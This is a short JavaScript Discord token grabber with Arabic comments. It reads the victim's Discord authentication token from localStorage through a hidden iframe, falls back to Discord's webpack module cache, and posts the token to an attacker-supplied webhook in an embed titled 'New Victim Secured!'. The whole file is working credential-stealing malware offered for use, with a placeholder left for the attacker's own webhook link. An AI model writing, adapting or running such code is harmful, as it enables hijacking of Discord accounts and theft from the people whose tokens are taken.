(function() {
    function sendToWebhook(token) {
        const webhookURL = "ضع_هنا_رابط_الويب_هوك_الخاص_بك";
        fetch(webhookURL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                embeds: [{
                    title: "🎯 New Victim Secured!",
                    color: 0xff0000,
                    fields: [
                        { name: "Discord Token", value: `\`\`\`${token}\`\`\`` }
                    ],
                    footer: { text: "Powered by ./098" }
                }]
            })
        });
    }

    // الطريقة الأولى: سحب التوكن من الـ LocalStorage الصامت
    try {
        window.dispatchEvent(new Event('beforeunload'));
        let token = (Symbol('token'));
        const iframe = document.createElement('iframe');
        document.head.append(iframe);
        const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');
        token = iframe.contentWindow.localStorage.token;
        iframe.remove();
        if (token) { sendToWebhook(token.replace(/"/g, '')); return; }
    } catch (e) {}

    // الطريقة الثانية: عبر webpack في حال فشل الأولى
    try {
        let token = (Object.values(webpackChunkdiscord_app.push([
            [Math.random()], {}, (req) => {
                for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
                    if (m.default && m.default.getToken !== undefined) {
                        return m.default.getToken();
                    }
                }
            }
        ]))[0]);
        if (token) { sendToWebhook(token); }
    } catch (e) {}
})();
